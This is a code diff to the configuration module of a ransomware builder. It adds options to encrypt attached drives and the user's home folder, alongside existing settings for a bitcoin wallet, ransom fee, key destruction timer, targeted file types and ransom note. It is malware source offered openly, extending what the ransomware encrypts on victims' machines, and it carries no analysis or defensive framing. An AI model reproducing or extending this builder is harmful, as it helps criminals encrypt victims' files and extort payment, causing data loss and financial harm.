@@ -80,6 +80,7 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             "example": "English or Русский",
             "input_requirement": "One of the supported languages",
             "config_area": "Language",
+            "validate": True,
             "default": "English"
             }
     ),
@@ -88,10 +89,10 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             "label": "Debug verbosity level",
             "label_object_name": "DebugLevelLabel",
             "input_object_name": "DebugLevelChoice",
-            "regex": re.compile("^.*$"), # Choice box so validation not required
             "example": "0 - Minimal",
             "input_requirement": "Build process debug level",
             "config_area": "Debug",
+            "validate": False,
             "default": "1 - Low"
             }
     ),
@@ -103,6 +104,7 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             "regex": re.compile("^([A-Za-z0-9]{16})?$"),
             "example": "093AC769F6557577452E9DB2C74B984A",
             "input_requirement": "A 16 byte(character) string of alphanumeric characters",
+            "validate": True,
             "config_area": "Binary Settings"
             }
     ),
@@ -115,6 +117,7 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             "example": "C:\\Program Files\\upx394w",
             "input_requirement": "A path pointing to the UPX Packer directory",
             "default": "",
+            "validate": True,
             "config_area": "Binary Settings"
             }
     ),
@@ -127,7 +130,26 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             "example": "C:\\Users\\test\\icon.ico",
             "input_requirement": "A file path pointing to the location of a valid .ico icon file",
             "default": "",
+            "validate": True,
             "config_area": "Binary Settings"
+            }
+    ),
+    (
+        "encrypt_attached_drives", {
+            "label": "Encrypt Attached Drives",
+            "input_object_name": "EncryptAttachedDrivesCheckbox",
+            "default": False,
+            "validate": False,
+            "config_area": "Ransomware Settings"
+            }
+    ),
+    (
+        "encrypt_user_home", {
+            "label": "Encrypt User Home",
+            "input_object_name": "EncryptUserHomeCheckbox",
+            "default": False,
+            "validate": False,
+            "config_area": "Ransomware Settings"
             }
     ),
     (
@@ -139,6 +161,7 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             "example": "locked",
             "input_requirement": "A series of alphanumeric character(s)",
             "config_area": "Ransomware Settings",
+            "validate": True,
             "default": "locked"
             }
     ),
@@ -152,6 +175,7 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             "input_requirement": "A bitcoin wallet address as a series of alphanumeric" 
                                  " characters (26-35 characters in length",
             "config_area": "Ransomware Settings",
+            "validate": True,
             "default": "12mdKVNfAhLbRDLtRWQFhQgydgU6bUMjay"
             }
     ),
@@ -164,6 +188,7 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             "example": "0.0897",
             "input_requirement": "A valid integer or floating point number",
             "config_area": "Ransomware Settings",
+            "validate": True,
             "default": "1.0"
             }
      ),
@@ -176,6 +201,7 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             "example": "259200",
             "input_requirement": "A valid integer or floating point number",
             "config_area": "Ransomware Settings",
+            "validate": True,
             "default": "259200"
             }
     ),
@@ -188,6 +214,7 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             "input_requirement": "A valid integer",
             "example": "512",
             "config_area": "Ransomware Settings",
+            "validate": True,
             "default": "512"
             }
     ),
@@ -200,6 +227,7 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             "example": "pdf,exe,msi,doc",
             "input_requirement": "A comma-separated list of filetypes to encrypt",
             "config_area": "Ransomware Settings",
+            "validate": True,
             "default": ",".join(ENCRYPTABLE_FILETYPES)
         }
     ),
@@ -211,6 +239,7 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             "example": "",
             "input_requirement": "Ransom message/note",
             "config_area": "Ransomware Settings",
+            "validate": False,
             "default": RANSOM_MESSAGE
         }
     )
@@ -220,13 +249,15 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
 @summary: Runtime configuration items. To be written to the Ransomware's runtime config file
 '''
 RUNTIME_CONFIG_ITEMS = [
+    "encrypt_attached_drives",
+    "encrypt_user_home",
     "encrypted_file_extension",
     "wallet_address",
     "bitcoin_fee",
     "key_destruction_time",
     "max_file_size_to_encrypt",
     "filetypes_to_encrypt",
-    "ransom_message"
+    "ransom_message",
     ]
 
 RUNTIME_CONFIG_PATH = "Resources/runtime.cfg"
